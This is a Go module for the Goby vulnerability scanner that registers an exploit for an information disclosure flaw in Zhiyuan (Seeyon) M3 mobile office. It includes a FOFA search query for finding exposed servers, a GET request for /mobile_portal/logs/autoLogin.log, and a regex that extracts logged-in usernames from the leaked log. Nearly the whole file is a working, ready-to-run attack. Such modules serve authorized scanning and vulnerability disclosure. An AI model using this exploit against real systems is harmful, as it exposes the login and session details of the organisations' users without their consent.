package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Zhiyuan M3 /mobile_portal/logs/autoLogin.log Information Disclosure Vulnerability",
    "Description": "<p>Zhiyuan M3 Mobile Office is a one-stop intelligent work platform created by Zhiyuan Internet, providing comprehensive enterprise mobile business management. It is committed to building intelligent mobile application scenarios centered on people, promoting personnel's work enthusiasm and creativity, and improving enterprise efficiency and efficiency. It is a mobile intelligent collaboration platform tailored for enterprises.</p><p>Attackers can read sensitive system information by constructing special URL addresses.</p>",
    "Product": "zhiyuan M3",
    "Homepage": "https://www.seeyon.com/home/Zhuanq/m3.html",
    "DisclosureDate": "2024-05-13",
    "PostTime": "2024-05-14",
    "Author": "1971714067@qq.com",
    "FofaQuery": "body=\"M3 Proxy Server\"",
    "GobyQuery": "body=\"M3 Proxy Server\"",
    "Level": "2",
    "Impact": "<p>Attackers can read sensitive system information by constructing special URL addresses.</p>",
    "Recommendation": "<p>At present, there is no detailed solution provided. Please follow the manufacturer's homepage for updates: <a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "select",
            "value": "autoLogin.log",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/mobile_portal/logs/autoLogin.log",
                "follow_redirect": false,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Session",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/mobile_portal/logs/autoLogin.log",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/mobile_portal/logs/autoLogin.log"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/mobile_portal/logs/{{{filepath}}}",
                "follow_redirect": false,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "contains",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Session",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "test|lastbody|regex|Login User : (.*?) Login From : Client",
                "output|define|text|获取的信息是: {{{test}}}"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.3",
    "Translation": {
        "CN": {
            "Name": "致远 M3 /mobile_portal/logs/autoLogin.log 信息泄露漏洞",
            "Product": "致远M3",
            "Description": "<p>致远M3移动办公是致远互联打造的一站式智能工作平台，提供全方位的企业移动业务管理，致力于构建以人为中心的智能化移动应用场景，促进人员工作积极性和创造力，提升企业效率和效能，是为企业量身定制的移动智慧协同平台。<br></p><p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a><br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Zhiyuan M3 /mobile_portal/logs/autoLogin.log Information Disclosure Vulnerability",
            "Product": "zhiyuan M3",
            "Description": "<p>Zhiyuan M3 Mobile Office is a one-stop intelligent work platform created by Zhiyuan Internet, providing comprehensive enterprise mobile business management. It is committed to building intelligent mobile application scenarios centered on people, promoting personnel's work enthusiasm and creativity, and improving enterprise efficiency and efficiency. It is a mobile intelligent collaboration platform tailored for enterprises.</p><p>Attackers can read sensitive system information by constructing special URL addresses.</p>",
            "Recommendation": "<p>At present, there is no detailed solution provided. Please follow the manufacturer's homepage for updates: <a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a><br></p>",
            "Impact": "<p>Attackers can read sensitive system information by constructing special URL addresses.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10950"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}